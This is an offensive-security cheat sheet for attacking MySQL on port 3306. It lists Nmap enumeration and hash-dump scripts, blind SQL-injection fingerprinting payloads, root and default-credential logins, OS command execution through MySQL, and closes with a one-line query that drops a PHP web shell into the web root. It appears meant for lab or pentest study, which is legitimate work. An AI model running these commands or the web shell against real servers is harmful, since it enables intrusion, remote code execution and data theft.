# MySQL \[3306]

### Nmap

```
nmap -sV -Pn -vv --script=mysql-audit,mysql-databases,mysql-dump-hashes,mysql-empty-password,mysql-enum,mysql-info,mysql-query,mysql-users,mysql-variables,mysql-vuln-cve2012-2122 <ip> -p 3306 ​ 
nmap -sV -Pn -vv --script=mysql* <ip> -p 3306 
```

### Fingerprinting

<table><thead><tr><th width="140">Payload</th><th width="182">When to Use</th><th>Expected Output</th><th>Wrong Output</th></tr></thead><tbody><tr><td><code>SELECT @@version</code></td><td>When we have full query output</td><td>MySQL Version 'i.e. <code>10.3.22-MariaDB-1ubuntu1</code>'</td><td>In MSSQL it returns MSSQL version. Error with other DBMS.</td></tr><tr><td><code>SELECT POW(1,1)</code></td><td>When we only have numeric output</td><td><code>1</code></td><td>Error with other DBMS</td></tr><tr><td><code>SELECT SLEEP(5)</code></td><td>Blind/No Output</td><td>Delays page response for 5 seconds and returns <code>0</code>.</td><td>Will not delay response with other DBMS</td></tr></tbody></table>

### Local Access

if you gain access to target box and see mysql running , you can try to connect with it from target locally

```
mysql -u root 
# Connect to root without password

mysql -u root -p 
# A password will be asked
# Always test root:root credential

```

### Remote Access

```
mysql -h <Hostname> -u root

mysql -h <Hostname> -u root@localhost

mysql -u julio -pPassword123 -h 10.129.20.13
mysql -h 142.93.47.151 -P 32568 -u root -ppassword
# MySQL - Connecting to the SQL Server

sqsh -S 10.129.203.7 -U julio -P 'MyPassword!' -h
# sqsh is alternative for myslq but in Linux

mssqlclient.py -p 1433 julio@10.129.203.7
# Impacket script for linux
```

> Specify the domain name or the hostname to use Windows Authentication. For local account use `SERVERNAME\\accountname` or `.\\accountname`&#x20;

### If running as root <a href="#if-running-as-root" id="if-running-as-root"></a>

If Mysql is running as root and you have acces, you can run commands:

```
mysql> select do_system('id');

mysql> \! sh
```

### Exploring database

<table><thead><tr><th width="322">Commands</th><th>Description</th></tr></thead><tbody><tr><td><code>show databases;</code></td><td>List all the databases.</td></tr><tr><td><code>use &#x3C;database>;</code></td><td>select the database from available databases.</td></tr><tr><td><code>show tables;</code></td><td>List all the tables.</td></tr><tr><td><code>describe &#x3C;table>;</code></td><td>To see what the structure of a table</td></tr><tr><td><code>SELECT &#x3C;column1>, &#x3C;column2> FROM &#x3C;table>;</code></td><td>print out all the vlaues from the table and columns specified.</td></tr><tr><td><code>SELECT * FROM &#x3C;table> WHERE &#x3C;column> = "&#x3C;str>";</code></td><td>list contents where search item is located.</td></tr><tr><td><code>SELECT * FROM logins WHERE username LIKE 'admin%';</code></td><td><code>%</code> matches all characters after <code>admin</code><br><code>_</code> match exactly one character</td></tr><tr><td><code>CREATE DATABASE users;</code></td><td>Creates database</td></tr><tr><td><code>INSERT INTO logins VALUES(1, 'admin', 'p@ssw0rd', '2020-07-02');</code></td><td>add new records to a given table</td></tr><tr><td><code>DROP TABLE logins;</code></td><td>remove tables and databases</td></tr><tr><td><code>SELECT * FROM logins ORDER BY password;</code></td><td>sort the results of any query and specifying the column to sort by</td></tr><tr><td><code>SELECT * FROM logins LIMIT 2;</code></td><td><a href="https://dev.mysql.com/doc/refman/8.0/en/limit-optimization.html">LIMIT</a> the results to what we want</td></tr><tr><td><code>SELECT * FROM logins LIMIT 1, 2;</code></td><td>LIMIT with offset (start from 2nd(1) stop at 3rd(2))</td></tr></tbody></table>

[CVE-2012-2122](https://www.trendmicro.com/vinfo/us/threat-encyclopedia/vulnerability/2383/mysql-database-authentication-bypass)

`MySQL` default system schemas/databases:

* `mysql` - is the system database that contains tables that store information required by the MySQL server
* `information_schema` - provides access to database metadata
* `performance_schema` - is a feature for monitoring MySQL Server execution at a low level
* `sys` - a set of objects that helps DBAs and developers interpret data collected by the Performance Schema

## Command execution

`MySQL` doesn't have `xp_cmdshell` but we can write a code and find a way to execute it instead (ASP.NET, PHP)

**MySQL - Write Local File**

```shell-session
mysql> SELECT "<?php echo shell_exec($_GET['c']);?>" INTO OUTFILE '/var/www/html/webshell.php';
```
